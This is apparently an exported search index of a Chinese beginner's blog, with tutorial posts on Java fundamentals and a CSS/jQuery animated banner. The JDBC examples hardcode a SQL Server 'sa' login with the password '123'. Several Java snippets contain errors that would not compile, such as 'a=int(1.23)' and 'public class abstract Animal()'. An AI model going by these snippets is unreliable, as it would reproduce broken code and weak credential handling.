conn=null;//连接对象 Statement stmt=null;//SQL指令集 ResultSet rs=null;//查询结果集 try &#123; Class.forName(&quot;com.microsoft.sqlserver.jdbc.SQLServerDriver&quot;); String url=&quot;jdbc:sqlserver://192.168.0.149:1433;DatabaseName=baiYi&quot;; //test为你的数据库的名称 String user=&quot;sa&quot;; String password=&quot;123&quot;; conn=DriverManager.getConnection(url,user,password); stmt=conn.createStatement(); String query=&quot;&quot;; stmt.executeUpdate(query); rs=stmt.executeQuery(&quot;select * from Student&quot;); while(rs.next())&#123; System.out .println(rs); &#125; &#125; catch (ClassNotFoundException e) &#123; // TODO Auto-generated catch block System.out.println(&quot;找不到驱动程序！&quot;); e.printStackTrace(); &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally&#123; try &#123; rs.close();//关闭结果集 stmt.close();//关闭指令集 conn.close();//关闭连接 &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java-String,StirngBuffer]]></title>
      <url>%2F2016%2F07%2F22%2FJava-String%2CStirngBuffer%2F</url>
      <content type="text"><![CDATA[0x1 String类Java中，字符串被存储为String类对象，String类包含在java.lang包中，Java启动时会自动加载。 String类是不可变对象，程序员不能对已有的不可变对象进行更改。虽然String拥有可编辑字符串的功能，但这些功能是通过创建一个新的对象来实现的，不是对原有的对象进行直接编辑。 比如: 123String s=&quot;hello world&quot;;s=s.replace(&quot;world&quot;,&quot;universe&quot;);System.out.println(s); 输出结果:hello universe s.replace()的调用将会创建一个新字符串”hello universe”，并返回该对象的引用。赋值后，s将指向新的引用，若没有其它引用指向”hello world”，原来的字符串对象将被垃圾回收。 String是唯一一个不需要new关键字来创建对象的类。 此外： 12345678910111213141516171819202122232425262728293031public class TestString &#123; /** * @param args */ public static void main(String[] args) &#123; // TODO Auto-generated method stub String s1=&quot;abc&quot;; //在字符串池中创建了一个对象 String s2=&quot;abc&quot;; //字符串池中已经存在对象&quot;abc&quot;,所以创建0个对象，累计创建一个对象 System.out.println(s1==s2); //true，指向同一个对象(==比较的是引用所指向额对象在堆中的地址) System.out.println(s1.equals(s2)); //true，内容相同 String s3= new String(&quot;abc&quot;); //创建了两个对象，一个存放在字符串池中，一个存放在堆中 //还有一个对象引用存放在栈中 String s4= new String(&quot;abc&quot;); //字符串池中已经存在对象&quot;abc&quot;，所以只在堆中创建了一个对象 System.out.println(s3==s4); //false,s3和s4栈地址不同，并且指向堆中不同的地址 System.out.println(s3.equals(s4)); //ture，内容相同 &#125;&#125; 0x01 String中的常用方法1234567891011121314151617181920212223242526package com.jack.java;public class testman &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub String str=&quot;abcdefghi&quot;; String str2=str; String str1=&quot;hello world&quot;; System.out.println(str); System.out.println(str.length());//返回字符的长度 System.out.println(str.charAt(2));//返回字符串中下标为2的字符 System.out.println(str.substring(0,4));//返回下标[0,4)之间的字符串 System.out.println(str.indexOf(&quot;def&quot;));//返回def字符串的下标 System.out.println(str.startsWith(&quot; &quot;));//判断str是否以空格开头 System.out.println(str.endsWith(&quot;f&quot;));//判断str是否以字符f结尾 System.out.println(str.equals(str1));//比较str与str1的内容是否相等 System.out.println(str.trim());//去掉str前后的空格，并返回新的字符串 System.out.println(str.toUpperCase());//将str转换为大写，并返回新的字符串 System.out.println(str.toLowerCase());//将str装换为小写，并返回新的字符串 System.out.println(str.replace(&quot;abc&quot;,&quot;jklop&quot;));//只能替换连续的字符串，并且原字符串对象依然存在，只是str引用的位置变了 System.out.println(str2); &#125;&#125; 0x2 StringBufferstringBuffer是一个可变对象，只能通过构造函数来建立，并通过s.append()方法对其追加元素。 当对其进行修改时不会像String那样重新建立新的对象，因此它的效率将会明显高于String。 12345678910111213String s1=&quot;abc&quot;; StringBuffer s2=new StringBuffer(&quot;abc&quot;); Runtime runtime=Runtime.getRuntime(); long start =System.currentTimeMillis(); long startFreeMemory=runtime.freeMemory(); for(int i=0;i&lt;10000;i++)&#123; s1+=i; //s2.append(&quot;1&quot;); &#125; long endFreeMemory=runtime.freeMemory(); long end =System.currentTimeMillis(); System.out.print(&quot;耗时:&quot;+(end-start)+&quot;ms,&quot;+&quot;内存消耗:&quot; +(startFreeMemory-endFreeMemory)/1024/1024+&quot;M&quot;); 输出: 12耗时:549ms,内存消耗:1M耗时:4ms,内存消耗:0M]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(9)类属性]]></title>
      <url>%2F2016%2F07%2F21%2F-Java(9)%E7%B1%BB%E5%B1%9E%E6%80%A7(static)%2Cfinal%2F</url>
      <content type="text"><![CDATA[0x00 关于staticstatic可以用来修饰类的成员方法和成员变量，此外，还可以用来编写static代码块来提高程序性能。static关键字定义的属性或者方法不属于对象，而是属于整个类的。 static方法static方法一般成为静态方法，它不依赖于任何对象就可以进行访问，因此对于静态方法来说是没有this的。由于这个特性，在静态方法中不能访问类的非静态变量和非静态方法，因为它们必须依赖于具体的对象才能被调用。但是在非静态方法中是可以访问静态成员方法/变量的。 至于为什么main函数必须是static的，现在就可以很清楚了。 此外，虽然没有显示的声明为static，类的构造器实际上也是静态的。 static变量static变量就是静态变量，与非静态变脸的区别是:静态变量被所有的对象所共享，在内存中只有一个副本，当且仅当在类初次加载是会被初始化。而费静态变量是对象所拥有的，在创建对象的时候被初始化，存在多个副本，各个对象拥有的副本互不影响。 static代码块同时也可以用于静态代码块，在类加载的时候默认执行一次，并且优先于构造方法。 关于static的误区1.stattic不能用于修饰局部变量。2.static不会改变变量或者方法的作用域。Java中能够影响到访问权限的只有private，public，protected. 对象方法修改类数据有了static这个方法，便可以构建类的属性了，它们将会被所有成员对象/方法共享。 12345678910111213141516171819202122package com.jack.second;public class Human &#123; public Human(int h)&#123; this.height= this.height+h; Human.population=Human.population+1; &#125; public int getHeight()&#123; return this.height; &#125; public void growHeight(int h)&#123; this.height=this.height+h; &#125; public void breath()&#123; System.out.println(&quot;huhuhuhu&quot;); &#125; private int height; private static int population;&#125; 每创建一个对象时，都过通过该对象的构造方法修改类数据，为population类数据增加1。 0x01 finalfinal代表终极的意思。 final关键字的含义是：这个数据/方法/类不能被改变了 final基本类型数据:定值(constant value)只能复制一次，不能再被修改 final方法:该方法不能被覆盖 final类:该类不能被继承。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(10)对象引用]]></title>
      <url>%2F2016%2F07%2F21%2F-Java(10)%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%EF%BC%88object-reference%EF%BC%89%2F</url>
      <content type="text"><![CDATA[0x00 对象应用以Huma类和Test类为例。 在Test类中创建一个Human类的实例 1Human aPerson= new Human(160); 深入来看看上面一条语句: 首先new在内存的堆(heap)中上为对象开辟一块空间，这个块空间上保存了对象的数据和方法。 2.而aPerson存在于内存的栈（Stack）中，指代Human的一个对象，被称为对象引用（object reference）。实际上，aPerson并不是对象本身，而是类似于一指向对象的指针。 3.当使用等号赋值时，是将右侧new在堆中创建对象的地址赋予对象引用。 栈的读取速度快于堆，但存储的数据却受到有效范围的限制。在C中，当一次函数调用结束时，相应的栈帧(Stack frame)要被删除，栈帧上存储的参量和局部变量会消失，Java也一样，即是方法存储在栈上的数据会清空。java中，所有的普通类型对象都存储在堆上。 而对于基本类型(primitive type)对象，如int，double存储在栈上。当声明基本类型时，不需要new，而是直接在栈上存储基本类型的数据。所以，基本类型的变量名表示的是数据本身，不是引用。 当将一个引用赋值给另一个引用时，实际上复制的是对象的地址。两个引用将指向同一个对象。 0x1 垃圾回收当方法结束时，引用和基本类型变量会被清空。但是对象在于堆中，其在内存中所占据的空间不会随着方法调用的结束而被清空。所以进程空间可能被不断创建的对象所占满。 Java内建的垃圾回收(garbage collection)机制，只会在当没有任何引用指向某个对象时，该对象才会被清空。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(8)异常处理]]></title>
      <url>%2F2016%2F07%2F20%2FJava-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%2F</url>
      <content type="text"><![CDATA[0x1 Java异常处理机制Java中异常处理机制，可以使程序发生异常的时候抛出(throw)代表当前状况的对象，逐层退出方法调用，直到遇到异常处理器(Exception Handler)，\异常处理器可以捕捉(catch)到异常对象，并根据对象来决定下一步的行动。 其中try负者监视程序块，catch代表所要捕获的异常的类型，并捕获相应的类型及其衍生类。catch可以有多个参数，以对应try可能出现的多个异常。最后，不论异常是否发生，finally中的程序都会被执行。 比如对数据库连接异常的处理 123456789101112131415161718192021222324252627282930313233343536public static void main(String[] args) &#123;// TODO Auto-generated method stub Connection conn=null; Statement stmt=null; ResultSet rs=null; try &#123; Class.forName(&quot;com.microsoft.sqlserver.jdbc.SQLServerDriver&quot;); String url=&quot;jdbc:sqlserver://192.168.0.149:1433;DatabaseName=baiYi&quot;; //test为你的数据库的名称 String user=&quot;sa&quot;; String password=&quot;123&quot;; conn=DriverManager.getConnection(url,user,password); stmt=conn.createStatement(); String query=&quot;&quot;; stmt.executeUpdate(query); rs=((java.sql.Statement) stmt).executeQuery(&quot;select * from Student&quot;); while(rs.next())&#123; System.out .println(rs); &#125; &#125; catch (ClassNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;finally&#123; try &#123; rs.close(); stmt.close(); conn.close(); &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端实战(1)-动画Banner设计]]></title>
      <url>%2F2016%2F07%2F19%2F%E5%89%8D%E7%AB%AF%E5%AE%9E%E6%88%98(1)-%E5%8A%A8%E7%94%BBBanner%E8%AE%BE%E8%AE%A1%2F</url>
      <content type="text"><![CDATA[0x01 内联元素与块元素HTML文档中的元素大概可分为inline element和block element两种。块元素可以包含其他块或内联元素。如H1-H6，div,p,ul，ol等，但是H5中将a元素划分为了块元素，但是a元素依旧不能包含支持点击的交互元素如,等。 0x02 background简写属性CSS中有多个属性用于设置背景样式，其中background-color设计背景颜色，background-imag指定要使用的背景图像，background是否以及如何重复图像，background-attachment是否固定，background-position图像位置。 1#p &#123;background:#f8f8f8 url(./images/sign.png) no-repeat 0 4px;&#125; 0x03 CSS定位CSS有四种不同类型的定位，static(默认定位)，relative(相对定位)，absolute(绝对定位)，fixed(固定定位). relative的元素不脱离文档流，而是参考自身右上角位置通过top，bottom，left，right进行定位。它原本所占用的空间位置会被保留，不会别其它元素所占用。 absolute和fixed的元素都是脱离文档流的，元素原先的空间位置会被关闭。但是absolute元素的位置相对于最近的已经定位的最先元素，若是没有已定位的祖先元素，则相对于最初的块。fixed则是选对于流浪器某个位置固定的，即使拖动浏览器的滚动条，该元素的位置也不会变。 0x04 font简写属性字体属性的样式有字体系列(font-family),字体大小(font-size),行间距(line-height),字体风格(font-style），字体粗细(font-weight)。 不同于background简写属性，font简写属性遵循如下规则：1.至少要指定字体大小与字体系列 1font:12px &quot;Times New Roman&quot;; 2.行间距添加到字体大小之后，使用”/“分割 1font:1opx/1.5 &quot;Times New Romam&quot;; 3.设置字体粗细，字体风格，字体变体属性时，要添加到字体大小之前 1font:bold italic small-caps 12px/1.5 &quot; Times New Roman&quot;; 0x04 伪类CSS中与超链接有关的伪类如下: 种类 说明 :link 向未被访问的链接添加样式 :visited 向已被访问的链接添加样式 :hover 鼠标悬浮时的样式 :active 向被激活的元素添加样式 :focus 获得聚焦时的样式 0x05 Transition动画Transition动画通过transition属性值来指定,四个属性如下 属性 说明 tansition-property 指定html元素的哪个css属性来执行动画处理 transition-duration 渐变时间 transition-timing-funciton 动画效果，有linear，ease，ease-in，easr-out和ease-in-out等 transition-delay 延迟时间 同样transition属性也是支持简写的: 12345a.banner&#123; background:url(./Images/e.ico) no-repeat -100px 140px, url(./Images/a.ico) no-repeat -20px -380px; transition:background-position .2s ease-in .2s;&#125; 0x06 使用jQuery播放声音实现效果，当鼠标悬浮或者聚焦到某个元素时，开始播放声音。 编写播放声音的js插件代码12345678910111213141516;(function($)&#123;//javascript自运行函数 $.fn.banner_sound=function(audio_src)&#123;//使用jQuery.fn原型编号banner_sound函数 var banner_audio; return this.each(function()&#123;//返回this对象 $(this) .bind(&apos;mouseover focusin&apos;,function()&#123; banner_audio=new Audio(audio_src);//传入音频对象的路径 banner_audio.play(); &#125;) .bind(&apos;mouseout focusout&apos;,function()&#123; banner_audio.pause(); &#125;); &#125;); &#125;;&#125;)(jQuery);//在内部使用$代替jQuery 在html中调用1234567891011&lt;head&gt; &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;banner.js&quot;&gt;&lt;/script&gt; &lt;script &gt; (function($)&#123; $(function()&#123; $(&apos;.banner&apos;).banner_sound(&apos;./Media/2CELLOS - Clocks.mp3&apos;); &#125;); &#125;)(jQuery); &lt;/script&gt;&lt;/head&gt; 0x6 最后设计网页动态横幅的所有代码。 HTML代码 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;tittle&gt;CSS3 Banner Design -动画Banner设计&lt;/tittle&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;banner.css&quot;/&gt; &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;banner.js&quot;&gt;&lt;/script&gt; &lt;script &gt; (function($)&#123; $(function()&#123; $(&apos;.banner&apos;).banner_sound(&apos;./Media/2CELLOS - Clocks.mp3&apos;); &#125;); &#125;)(jQuery); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;a class=&quot;banner&quot; href=&quot;http://www.baidu.com&quot;&gt;&lt;img class=&quot;banner-logo&quot; src=&quot;../Image/1.jpg&quot; alt=&quot;baidu.com&quot; width=&quot;167&quot; height=&quot;134&quot;/&gt; &lt;p class=&quot;banner-desc&quot; &gt; who am i?&lt;br/&gt; where am i?&lt;br/&gt; &lt;strong&gt;onejustone&lt;/strong&gt; &lt;/p&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; CSS代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364@charset &quot;utf-8&quot;;body&#123; padding:20px; background:#333333;&#125;a.banner&#123; display:block; width:728px; height:176px; border:1px solid #555;&#125;a.banner&#123; background:url(Images/e.ico) no-repeat -100px 140px, url(Images/child_128px_1176085_easyicon.net.png) no-repeat -40px 220px, url(Images/a.ico) no-repeat -20px -380px, url(Images/c.ico) no-repeat 0 0; transition:background-position .2s ease-in .2s;&#125;a.banner .banner-logo&#123; position:absolute; top:20px; left:540px;&#125;a.banner&#123; position:relative; display: block;&#125;/*设置Banner文字的位置和颜色*/a.banner .banner-desc&#123; opacity:0; position:absolute; top:35px; left:170px; font:30px/0.9 &quot;Nanum Pen Script&quot;; color:#4ec1cd;&#125;a.banner .banner-desc strong&#123; font-size:23px;&#125;/*当聚焦或者悬浮时显示图片*/a.banner:hover,a.banner:focus&#123; background-position:20px 140px,-40px 20px,-20px -90px,0,0;&#125;/*设置文本透明度为0，当聚焦或者鼠标悬浮时显示*/a.banner:hover .banner-desc,a.banner:focus&#123; opacity:1;&#125;/*设置logo图片居中*/a.banner .banner-logo&#123; position:absolute; top:20px; left: 50%;&#125; JS代码: 12345678910111213141516;(function($)&#123;//javascript自运行函数 $.fn.banner_sound=function(audio_src)&#123;//使用jQuery.fn原型编号banner_sound函数 var banner_audio; return this.each(function()&#123;//返回this对象 $(this) .bind(&apos;mouseover focusin&apos;,function()&#123; banner_audio=new Audio(audio_src);//传入音频对象的路径 banner_audio.play(); &#125;) .bind(&apos;mouseout focusout&apos;,function()&#123; banner_audio.pause(); &#125;); &#125;); &#125;;&#125;)(jQuery);//在内部使用$代替jQuery]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(5)继承(inheritance)]]></title>
      <url>%2F2016%2F07%2F19%2FJava(5)%E7%BB%A7%E6%89%BF%2F</url>
      <content type="text"><![CDATA[0x01 继承继承(inheritance)是除组合(composition)外，提高代码重复可以性的另一种方式。 先定义给一个Human类: 1234567891011121314151617181920package com.jack.second;public class Human &#123; public Human(int h)&#123; this.height= this.height+h; &#125; public int getHeight()&#123; return this.height; &#125; public void growHeight(int h)&#123; this.height=this.height+h; &#125; public void breath()&#123; System.out.println(&quot;huhuhuhu&quot;); &#125; private int height;&#125; 然后在Human类的基础上定义一个Woman类，使用关键字extends让Woman继承自Homan。 1234567891011package com.jack.second;public class Woman extends Human&#123; public Woman(int h) &#123; super(h); &#125; public void giveBirth()&#123; System.out.println(&quot;Give Birth a woman&quot;); &#125;&#125; 如上，通过继承以此创建了一个新的类，叫做衍生类(derived class)。而被继承的类叫做基类(base class)。 衍生类以基类作为自己定义的基础，并补充基类中没有定义的giveBirth()方法。 下面使用TestWoman类测试 12345678910111213141516package com.jack.second;public class TestHuman &#123; /** * @param args */ public static void main(String[] args) &#123; // TODO Auto-generated method stub Woman p=new Woman(20); p.breath(); p.growHeight(100); System.out.println(p.getHeight()); p.giveBirth(); &#125;&#125; 整个过程可以分为三个层次:”基类定义”,”衍生类定义”,”外部使用”。 0x01 protected现在可以看看protected的含义了。被proteced定义的成员和方法在该类及其衍生类中可见。就是说，基类的protected成员可以被衍生层访问，但是不能被外部访问。 0x02 方法覆盖子类将会继承父类的所有属性和方法，并且在程序加载时，将会优先加载父类的所有特征。 Java是同时通过方法名和参数列表来判断所要调用的函数方法的。但是若是方法名和参数列表相同呢？(当然这种情况只会出现在基类及其衍生类中) 在子类中，可以使用super和this来确定是哪个方法。 但是在外部，呈现只是统一接口，所以无法提供这两种方法，这时Java会呈现子类方法而不是父类的方法，这种机制叫做方法覆盖(method overriding) 方法覆盖可以很好的利用用于修改基类成员的方法。 123456789101112131415161718package com.jack.second;public class Woman extends Human&#123; public Woman(int h) &#123; super(h); &#125; public void giveBirth()&#123; System.out.println(&quot;Give Birth a woman&quot;); &#125; public void breath()&#123; System.out.println(&quot;hahaha&quot;); &#125;&#125; 0x03 构造方法子类会继承父类的所有属性和特征，在程序加载时将会优先加载父类的成员和方法。所有基类的构造方法应该先被调用。这与方法覆盖并不冲突。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(11)多态与类型转换]]></title>
      <url>%2F2016%2F07%2F19%2FJava(11)%E5%A4%9A%E6%80%81%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%2F</url>
      <content type="text"><![CDATA[0x01 类型转换Java属于强类型语言（Strongly typing），它的任意变量和引用均需要经过类型声明(type declaration)才能 使用。 基本类型转换不同的基本类型有不同的长度和存储范围。 当从高精度类型转换到低精度类型，如float到int，有可能损失信息，这样的转换叫做收缩变换(narrowing conversion)。这种情况下，需要显示的声明类型转换。 12345678public class Test&#123; public static void main(String [ ] args) &#123; int a; a=int(1.23);//narrowing conversion &#125;&#125; 如果是从低精度类型向高精度类型的转换，则不会有信息的损失。这样的变换叫做宽松变换(widening conversion)，此时，并不需要显示的要求类型转换，Java会自动进行。 0x01 upcast与多态0x00 多态(polymorphism)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(4)封装与接口]]></title>
      <url>%2F2016%2F07%2F19%2FJava(4)%E5%B0%81%E8%A3%85%E4%B8%8E%E6%8E%A5%E5%8F%A3%2F</url>
      <content type="text"><![CDATA[0x00 封装(encapsulation)与接口(interface)封装，继承和多态是面向对象的三大特征。 封装可以隐藏属性以及行为实现的细节，并对外提供访问的接口，以此提高对象的易用性和安全性。 对象成员的封装Java通过三个关键字来控制对象成员个的外部可见性(visibility):public,private,protected. public:该成员外部可见，既该成员是接口的一部分。 private:该成员外部不可见，无法从外部访问。 protected:涉及继承的概念。 但是内部方法并不受封装的影响，可以调用任意的成员，即使是被设置为private的成员。 在Java的通常规范中，表达状态的数据成员要设置为private，对数据成员的修改要通过接口提供的方法进行。 在一个.java文件中，有且只能有一个类带有public关键字。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class Test&#123; public static void main (String [] args)&#123; Human aPerson = new Human(160); System.out.println(aPerson.getHeight()); aPerson.growHeight(170); System.out.println(aPerson.getHeight()); aPerson.repeatBreath(10); &#125;&#125; class Human&#123; /** *member */ private int height; /** *constructor */ public Human(int h)&#123; this.height=h; System.out.println(&quot;i&apos;am born&quot;); &#125; public int getHeight() &#123; return this.height; &#125; public void growHeight(int h) &#123; this.height=this.height+h; &#125; private void breath() &#123; System.out.println(&quot;huhuhuhu&quot;); &#125; public void repeatBreath(int rep) &#123; int i; for(i =0;i&lt;rep;i++) &#123; this.breath(); &#125; &#125; &#125; 实施接口(implements interface)Java提供了interface这一语法，可以将接口从类额具体定义中剥离出来，构成一个独立的主体。 接口是用来统一标准和规范的。 比如定义一个杯子的接口 1234interface Cup&#123; abstract void addWater(int w); abstract void drinkWater(int w);&#125; Cup接口中定义了两个方法的原型(stereotype):addWaer()和drinkWater()。在接口中我们不需要定义方法的主体，也不需要说明方法的可见性。因为这些都是默认为public的。 在类的定义中实施接口，比如在MusicCup类中实施Cup接口。 1234567891011121314class MusciCup implements Cup&#123; public void addWater(int w) &#123; this.water = this.water+w; &#125; public void drinkWater(int w) &#123; this.water =this.water-w; &#125; private int water=0;&#125; Java中使用implements关键字来实施接口(interface)。一旦在类中实施了某个接口，则必须在该类中定义接口的所有方法，类中的方法需要与interface中的方法原型相符合。 接口中所有的变量必须是常量且初始化，接口中所有的方法都是抽象的。 12345public interface Cup&#123; public static final String COLOR=&quot;red&quot;; public abstract void drinkWater();&#125; 接口实现的具体类中可以定义interface中没有提及的其它public方法，interface只是规定了一个必须要实施的最小接口。 0x01 接口继承接口继承与类继承很类似，就是以被继承的interface为基础，添加新增接口方法原型。 比如，以cup作为原接口； 123interface MetricCup extends Cup&#123; int WaterContent(); 在Java的衍生类中，一个衍生类只能有一个基类，就是一个类不能同时继承于多个类，但是interface可以是多重继承的。 比如有一个Player接口 123456interface Player&#123; void Play();&#125;新增一个MusiCup接口，它同时继承于Cup和Player接口 interface MusicCup extends Cup,Player{ void display();}```]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(3)构造器，重载与重写]]></title>
      <url>%2F2016%2F07%2F19%2FJava(3)%E6%9E%84%E9%80%A0%E5%99%A8%EF%BC%8C%E9%87%8D%E8%BD%BD%E4%B8%8E%E9%87%8D%E5%86%99%2F</url>
      <content type="text"><![CDATA[0x00 构造器与方法重载构造器java中的对象在创建对象时我们可以对其进行显示会初始化(initialization)。如果我们没给数成员赋予初始值，数据成员会根据其类型采用默认的初始值。 比如:整数型:0布尔型:False其它类型:null 显然显示初始化很不方便，这时我们便可以使用构造器(constructor)来初始化对象了，类似于C中的构造函数一样。 构造器的特征如下: 构造器的名字和类的名字相同 构造器没有返回值 定义Human类的构造器: 12345678910111213141516171819202122232425262728public class Test&#123; public static void main(String [] args) &#123; Human aPerson = new Human(160); System.out.println(aPerson.getHeight()); &#125;&#125;class Human&#123; /** *constructor */ Human(int h) &#123; this.height=h; System.out.println(&quot;i&apos;m born&quot;)； &#125; /** *accessor */ int getHeight() &#123; return this.height; &#125; int height;&#125; 一旦我们定义了自己的构造方式，Java便不会再提供默认的构造方法，此时需要自己写上默认的构造方法。 方法重载一个类可以定义多个构造函数，每个构造器间的参数不同，Java会同时根据方法名和参数列表来决定所要调用的方法，这叫方法重载(method overloading)。构造方法可以进行重载，普通方法也可以重载。 0x1 重写]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(1)基础概念]]></title>
      <url>%2F2016%2F07%2F19%2FJava(1)%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%2F</url>
      <content type="text"><![CDATA[0x00 HelloWorld首先我们来创建第一个java程序 1234567public class HelloWord&#123; public static void main(String [] args) &#123; system.out.println(&quot;HelloWold!&quot;); &#125;&#125; 首先Java第一个类的名称必须与java程序的名称对应，同时，java是强类型的语言，既它是大小写敏感的。最后语句的结束要使用;来结束。 同样java程序要经过编译器的编译才能运行，而java的夸平台性是因为java的程序的执行依赖于java虚拟机。 命令行下使用javac来编译java程序 1$: javac HelloWorld.java 当前路径下将生成一个名为HelloWorld.class的文件。 让后使用java运行程序 1$: java HelloWorld 0x01 java中的变量java和c都是静态类型的语言，在使用变量之前，要声明变量的类型。 同时java中的数据类型分类可分为基本数据类型和引用数据类型。 java中变量类型如下 数据类型 存储大小 byte 字节 8 bits int 整数 4 byte short 短整型 2 byte long 长整型 8 byte float 浮点型 4 byte doubel 双精度型 8 byte char 字符 2 byte boolean 1 bit 对于Java中的基本数据类型，一旦声明就会被分配内存空间，而普通类型需要使用new关键字来分配空间。 关于变量的命名推荐采用驼峰命名法。原则，见名知意。类：首字母大写,以后每个单词首字母大写包：包名全部小写方法：以小写字母开头，以后每个单词首字母大写变量：以小写字母开头，以后每个单词首字母大写常量：全部使用大写，并以”_”隔开。 switch语句中的表达式只能识别byte，int，short，char四种类型的数据类型。 0x02 java数组数组包含相同类型的多个数据。 java使用如下方式声明一个数组 1int[] a; 但是数组真正所需的空间并没有真正分配给数组，所以可以在声明的同时使用new来开辟数组所需的空间 1int [] a= new int[100] 在声明的同时给数组赋值并确定数组的大小 1int[] a = new int[]&#123;1, 4, 5, 5&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(7)抽象类组合内部类]]></title>
      <url>%2F2016%2F07%2F19%2FJava(7)%E6%8A%BD%E8%B1%A1%E7%B1%BB%E7%BB%84%E5%90%88%E5%86%85%E9%83%A8%E7%B1%BB%2F</url>
      <content type="text"><![CDATA[0x00 abstract 抽象类我们可以从多个具体的类中提取相同的属性和方法来构建一个总类，既是抽象类，这个类不能被实例化，以此作为子类的模板，以防止子类的。。。。可以使用abstract定义抽象类，此时抽象类中的方法将在子类中去实现，在父类中实现是无意义的。 12345678910111213public class abstract Animal()&#123; private String name; public abstract void sound();&#125;public class cat extends Animal()&#123; public void sound()&#123; Sytem.out.println(&quot;miao....&quot;); &#125;&#125; 0x01 组合 0x02 内部类]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(8)包package]]></title>
      <url>%2F2016%2F07%2F19%2FJava(8)%E5%8C%85package%2F</url>
      <content type="text"><![CDATA[0x00 package为了更好的组织代码，java引入包的概念。 包为Java程序提供了一个命名空间(name space)。一个Java类的完整路径由它的包和类名共同构成，比如com.vamei.society.Human。相应的Human.java程序要放在com/vamei/society/下。类是由完整的路径识别的，所以不同的包中可以有同名的类，Java不会混淆。 包的建立非常简单。 123456789package com.jack.society;public class Human&#123; public Human() &#123; this.height = 180; &#125; &#125; package com.jack.society表示该程序在com.jack.society包中。com.jack表示包作者的域名。society表示包的本地路径。 包管理的是.class文件。Java号称”一次编译，处处运行” (Compile Once, run anywhere)。.class文件可以在任意装有Java虚拟机(JVM, Java Virtual Machine)的平台上运行，这帮助我们克服了系统差异造成的程序移植困难。 在JVM的基础设施下，加上包的管理辅助，Java程序实现了良好的可移植性 (portability)。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(2)面向对象]]></title>
      <url>%2F2016%2F07%2F19%2FJava(2)%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%2F</url>
      <content type="text"><![CDATA[0x00 面向对象对象是计算机抽象世界的一种方式。世界上的每一个事物都可以称为一个对象(object)，对象有状态(State)和,__行为(Behavior)__。 对象的状态由数据成员(data member)表示。数据成员又被称为域(Field)。 对象还有操作，用于改变对象的状态，操作就睡对象的行为，行为由成员方法(member method)表示。 对象可以归为类(Class)，或者归为同一类型(Type)。同类的对象有相同的方法，相同类型的数据成员。类的实例(instance)是对象。 类具有属性,它是对象状态的抽象。类具有操作,它是对象的行为的抽象。 类实现了对像的数据(既状态)和行为的抽象。 概括的讲就是，对象中的数据成员表示对象的状态，对象可以执行方法以修改对象的状态表达动作。 调用同一对象的数据成员:123456789101112131415161718192021public class Test&#123; public static void main(String [] args) &#123; Huam aPerson = new Human(); System.out.println(aPerson.getHeight()); &#125;&#125;class Human&#123; /** * */ int getHeight() &#123; return this.height; &#125; int height;&#125; this是隐性参数，它用来指代对象自身。当创建一个aPerson实例时，this就代表了aPerson这个对象。this.aPerson指aPerson的height。 调用同一对象的其它方法12345678910111213141516171819202122232425262728public class Test&#123; public static void main(String [] args) &#123; Human aPerson = new Human; aPerson.repeatBreath(10); &#125;&#125;class Human&#123; void breath() &#123; System.out.println(&quot;huhu&quot;); &#125; /** *call breath() */ void repeatBreath(int rep) &#123; int i; for(i=0;i&lt;rep;i++) &#123; this.breath(); &#125; &#125;&#125; 数据成员的初始化显示初始化(explixcit initialization):当在声明数据成员的同时，提供数据成员的初始值。显示初始化的值要硬性的写在程序中。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Java(6)重写与重载]]></title>
      <url>%2F2016%2F07%2F19%2Fava(6)%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD%2F</url>
      <content type="text"><![CDATA[0x00 重写和重载0.常见的重写方法，getString(),getHashCode(), 1.凡是被final关键字修饰的类，方式，属性，便不能被继承，重写，修改，通常用于系统类。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(14)-数据库-sqlite3]]></title>
      <url>%2F2016%2F07%2F13%2FPython%E6%A0%87%E5%87%86%E5%BA%93(14)-%E6%95%B0%E6%8D%AE%E5%BA%93-sqlite3%2F</url>
